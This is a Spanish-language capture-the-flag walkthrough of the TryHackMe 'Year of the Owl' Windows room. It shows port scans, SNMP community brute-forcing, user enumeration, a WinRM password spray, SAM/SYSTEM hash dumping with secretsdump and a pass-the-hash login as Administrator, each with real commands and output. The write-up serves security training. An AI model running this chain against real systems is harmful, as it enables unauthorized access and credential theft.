## TryHackMe  <> Year of the Owl

![image](https://github.com/Esevka/CTF/assets/139042999/019512fc-ca13-4343-a942-7a7325593e6f)

Enlace Maquina: https://tryhackme.com/room/yearoftheowl

Enunciado : 

  - Consejo: When the labyrinth is before you and you lose your way, sometimes thinking outside the walls is the way forward
  - Conseguir Flags

## Escaneo de puertos

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/year_ofthe_owl/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.42.63 -oN open_ports              
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 13:24 CEST

    PORT      STATE SERVICE
    80/tcp    open  http
    139/tcp   open  netbios-ssn
    443/tcp   open  https
    445/tcp   open  microsoft-ds
    3306/tcp  open  mysql
    3389/tcp  open  ms-wbt-server
    5985/tcp  open  wsman
    47001/tcp open  winrm

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/year_ofthe_owl/nmap]
    └─# nmap -p 80,139,443,445,3306,3389,5985,47001 -sCV --min-rate 5000 -n -Pn 10.10.42.63 -oN info_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 13:29 CEST
    
    PORT      STATE SERVICE       VERSION
    80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
    |_http-title: Year of the Owl
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
    
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    
    443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
    |_http-title: Year of the Owl
    | tls-alpn: 
    |_  http/1.1
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    |_ssl-date: TLS randomness does not represent time
    
    445/tcp   open  microsoft-ds?
    
    3306/tcp  open  mysql?
    | fingerprint-strings: 
    |   NULL: 
    |_    Host 'ip-10-8-64-232.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
    
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2023-09-25T11:30:44+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=year-of-the-owl
    | Not valid before: 2023-09-24T08:51:09
    |_Not valid after:  2024-03-25T08:51:09
    | rdp-ntlm-info: 
    |   Target_Name: YEAR-OF-THE-OWL
    |   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
    |   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
    |   DNS_Domain_Name: year-of-the-owl
    |   DNS_Computer_Name: year-of-the-owl
    |   Product_Version: 10.0.17763
    |_  System_Time: 2023-09-25T11:30:04+00:00
    
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3306-TCP:V=7.94%I=7%D=9/25%Time=65116F30%P=x86_64-pc-linux-gnu%r(NU
    SF:LL,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-64-232\.eu-west-1\.compute\.i
    SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
    SF:aDB\x20server");
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2023-09-25T11:30:05
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_clock-skew: mean: -1s, deviation: 0s, median: -1s
    

-Despues de unas cuantas horas buscando por los servicios activos de la maquina no encontramos ningun punto de entrada.

    RECOPILACION:   
        WEB
        80,443 ----> No encontramos nada de valor 
        
        SMB
        139,445 ---> No tenemos credenciales 
        
        MySQL
        3306 ----> No tenemos credenciales (is not allowed to connect to this MariaDB server)
        
        TerminalService
        3389 ----->No tenemos credenciales  
        
        WinRM
        5985,47001 --->No tenemos credenciales  

-El tip del enunciado, me hizo recordar que por defecto siempre escanemos los puertos en TCP(EL protocolo TCP no es el unico), por lo que me dio por mirar en UDP.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/year_ofthe_owl/nmap]
    └─# nmap --top-ports 10 --open --min-rate 4000 -sU -vvv 10.10.121.136 -oN info_ports_UDP 
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 07:00 CEST
    
    PORT     STATE         SERVICE      REASON
    53/udp   open|filtered domain       no-response
    67/udp   open|filtered dhcps        no-response
    123/udp  open|filtered ntp          no-response
    135/udp  open|filtered msrpc        no-response
    137/udp  open|filtered netbios-ns   no-response
    138/udp  open|filtered netbios-dgm  no-response
    161/udp  open|filtered snmp         no-response
    445/udp  open|filtered microsoft-ds no-response
    631/udp  open|filtered ipp          no-response
    1434/udp open|filtered ms-sql-m     no-response

  Tras buscar y hacer varios tipos de escaneos, encontramos un puerto en UDP que pareceia interesante.

      161/udp  open|filtered snmp         no-response
   

## Analisis y explotacion del servicio SNMP del Puerto 161 UDP.

  Primero necesitamos saber que es y como funciona SNMP.

  INFO Pentesting SNMP ----> https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp

    INFO ChatGPT:
    
    1. **SNMP (Simple Network Management Protocol):** SNMP es un protocolo estándar de la industria utilizado
    para administrar y supervisar dispositivos de red. Permite a los administradores de red recopilar   
    información de estos dispositivos y enviar comandos a ellos.

    2. **Community String (Cadena de Comunidad):** En SNMP, la cadena de comunidad es una especie de 
    contraseña o clave compartida entre un administrador de red y un dispositivo SNMP. La cadena de comunidad 
    se utiliza para autenticar las solicitudes y respuestas SNMP entre el administrador y el dispositivo.

    Hay dos tipos principales de cadenas de comunidad en SNMP:
    
       -Cadena de comunidad de lectura (Read-Only): Permite al administrador acceder a información de supervisión, 
        pero no realizar cambios en la configuración del dispositivo.
         
       - Cadena de comunidad de escritura (Read-Write): Permite al administrador acceder a información de supervisión
       y realizar cambios en la configuración del dispositivo.
    
    3. **MIB (Management Information Base):** Una MIB es una base de datos jerárquica que almacena información
    de administración de red. Contiene una serie de objetos gestionados que representan aspectos específicos de
    un dispositivo o servicio. Los objetos en una MIB están organizados en una estructura de árbol
    y se identifican mediante números enteros únicos llamados OIDs (Object Identifiers).
    
    4. **OID (Object Identifier):** Un OID es un número único que identifica un objeto gestionado en una MIB.
    Los OIDs se utilizan para acceder a información específica en un dispositivo de red. Por ejemplo, 
    un OID podría identificar el número de interfaces en un router o el uso de la CPU en un servidor.
    
    En resumen, SNMP es un protocolo de administración de red que utiliza las cadenas de comunidad
    para autenticar y controlar el acceso a los dispositivos SNMP, MIBs para organizar información
    y OIDs para identificar objetos específicos dentro de esas MIBs. 


  - Obtenemos informacion de la maquina victima.
  
    1)Mediante un ataque de fuerza bruta obtenemos la comunidad del servicio SNMP.
  
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
        └─# onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.121.136
        Scanning 1 hosts, 120 communities
        10.10.121.136 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
    
      Comunidad --> openview
    

    2)Podemos leer info de la maquina victima de dos modos.

        - snmp-check(Muestra la info mas importante de manera automatica)
        - snmpwalk(Mostramos la info que queremos mediante el uso de OIDS)
    
      - snmp-check
        
            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
            └─# snmp-check -c openview 10.10.121.136     
            snmp-check v1.9 - SNMP enumerator
            Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
            
            [+] Try to connect to 10.10.121.136:161 using SNMPv1 and community 'openview'
            
            [*] System information:
            
              Host IP address               : 10.10.121.136
              Hostname                      : year-of-the-owl
              Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
              Contact                       : -
              Location                      : -
              Uptime snmp                   : 00:39:17.48
              Uptime system                 : 00:38:23.99
              System date                   : 2023-9-26 06:37:53.1
              Domain                        : WORKGROUP
            
            [*] User accounts:
            
              Guest               
              Jareth              
              Administrator       
              DefaultAccount      
              WDAGUtilityAccount

            [...]

    
      - snmpwalk

        OIDs Interesantes para extraer informacion de manera manual ---> https://github.com/refabr1k/OSCP/blob/master/snmp.md

        Extraemos de manera manual los Usuarios del SO

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
            └─# snmpwalk -v 2c -c openview 10.10.121.136 1.3.6.1.4.1.77.1.2.25
            iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
            iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
            iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
            iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
            iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"


  - Obtenemos Credenciales de acceso.

    Tenemos un listado de usuarios validos del sistema, de momento nos vamos a interesar por --- Jareth --- ya que no es un usuario default.

    El proceso para obtener las pass lo podemos realizar mediante los servicios que estan corriendo en la maquina--> SMB(OK), WinRM(OK) y  RDP(no funciono)
     
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
        └─# crackmapexec winrm 10.10.121.136 -u jareth -p /usr/share/wordlists/rockyou.txt 
        SMB         10.10.121.136   5985   YEAR-OF-THE-OWL  [*] Windows 10.0 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl)
        HTTP        10.10.121.136   5985   YEAR-OF-THE-OWL  [*] http://10.10.121.136:5985/wsman
        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [-] year-of-the-owl\jareth:123456
        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [-] year-of-the-owl\jareth:12345
        [.......]
        [*] completed: 100.00% (1/1)                                                                                                           
        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sa--- (Pwn3d!)       
   
        
## Obtenemos sesion en la maquina mediante WinRM.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
    └─# evil-winrm -i 10.10.38.87 -u jareth -p sa---
                                            
    Evil-WinRM shell v3.5
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
    year-of-the-owl\jareth

-Leemos la flag de usuario

    *Evil-WinRM* PS C:\Users\Jareth\Desktop> type user.txt
    THM{Y2I0N------------I2Y2U4M2IwZTBl}

## Elevamos privilegios

 Despues de un buen rato buscando y buscando, pudimos encontrar en la papelera un backup de los ficheros (SAM y SYSTEM)

    Archivo SAM (Security Account Manager):
    El archivo SAM almacena la información de las cuentas de usuario locales en un sistema Windows.
    Esto incluye nombres de usuario y las contraseñas en forma de hashes (representaciones cifradas de las contraseñas).

    Archivo SYSTEM
    El archivo "system" contiene suficiente información para descifrar los secretos de SAM y los secretos de LSA.

1) Obtenemos el SID del usuario actual en este caso jareth que es lo que nos interesa.
    
        *Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /user
  
        USER INFORMATION
        ----------------
        
        User Name              SID
        ====================== =============================================
        year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
  
2) Obtenemos el cotenido de su papelera de reciclaje.

        *Evil-WinRM* PS C:\Users\Jareth\Desktop> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'\
          
          Mode                LastWriteTime         Length Name
          ----                -------------         ------ ----
          -a----        9/18/2020   7:28 PM          49152 sam.bak
          -a----        9/18/2020   7:28 PM       17457152 system.bak

3) Nos descargamos los dos ficheros a nuestra maquina.

        *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp sam.bak c:\temp\sam.bak
     
        *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp system.bak c:\temp\system.bak

        *Evil-WinRM* PS C:\temp> download sam.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                   
        Info: Downloading C:\temp\sam.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                    
        Info: Download successful!
        
        *Evil-WinRM* PS C:\temp> download system.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak                                
        Info: Downloading C:\temp\system.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
        Info: Download successful!

4) Obtenemos Hash NT de los usuarios.

    Importante para entender la obtencion de los Hash: https://deephacking.tech/passwords-privilege-escalation-en-windows/#sam-system

        ┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
        └─# ./secretsdump.py -sam sam.bak -system system.bak LOCAL
        Impacket v0.11.0 - Copyright 2023 Fortra
        
        [*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9ed----------62fb0c0ddcfa7a:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
        Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
        [*] Cleaning up...

5) Acabamos de obtener el hash NT del usuario Administrator por lo que vamos a obtener una consola como dicho usuario.

       Una característica que tiene Windows, es que sabiendo el hash NT de un usuario, podemos obtener una shell sin necesidad de la contraseña(Info Anterior.)

   Mediante evil-winrm y el hash NT podemos realizar una conexion como Administrator.

       ┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
       └─# evil-winrm -i 10.10.38.87 -u Administrator -H 6bc99ede9edcfec-------fb0c0ddcfa7a
                                                
       Evil-WinRM shell v3.5
                                                
       Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                                
       Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                
       Info: Establishing connection to remote endpoint
       *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
       year-of-the-owl\administrator

   obtenemos flag admin

       *Evil-WinRM* PS C:\Users\Administrator\desktop> type admin.txt
        THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}


     
        


     



  

    


          

    
      

    

    

  



    


